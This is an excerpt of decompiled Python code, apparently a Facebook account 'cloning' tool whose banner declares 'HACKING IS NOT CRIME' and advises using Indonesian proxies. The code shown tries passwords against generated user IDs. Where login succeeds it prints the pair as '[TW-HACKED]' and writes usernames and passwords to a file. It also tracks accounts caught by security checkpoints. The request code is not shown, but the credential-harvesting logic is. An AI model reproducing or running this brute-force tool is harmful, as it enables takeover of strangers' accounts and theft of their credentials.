...
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 
# Embedded file name: RASHED
...
psb('\x1b[1;32mBANGLADESH 9 DIGIT CLONING START PLEASE WAIT .......')
...
logo = "\x9f\x92\x95\n\x1b[1;93m---------------------------------------------------\n\x1b[1;93m HACKING IS NOT CRIME IT'S A GAME AGAINST OF THE SYSTEM \n\x1b[1;96m\xe2\x9e\xa3   AUTHOR NAME: MAFIA(JIHAD)\n\x1b[1;93m\xe2\x9e\xa3   FACEBOOK: NO INTEREST\n\x1b[1;96m\xe2\x9e\xa3   WARNING: DON'T USE ILLEGAL WAY\n\x1b[1;97m\xe2\x9e\xa3   FB USER: NO INTEREST\n\x1b[1;91m\xe2\x9e\xa3   WARNING: USE 6GB RAM PHONE\n\x1b[1;92m\xe2\x9e\xa3   WARNING: IF YOU GET TO FACE PROBLEM CLONING TIME\n\x1b[1;93m\xe2\x9e\xa3   WARNING: USE PROXY INDONESIA FOR CLONING  \n\x1b[1;93m---------------------------------------------------"
back = 0
successful = []
cpb = []
oks = []
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[TW-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[TW-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m                   [Open After 7 Days :) ]\x1b[0m \n'
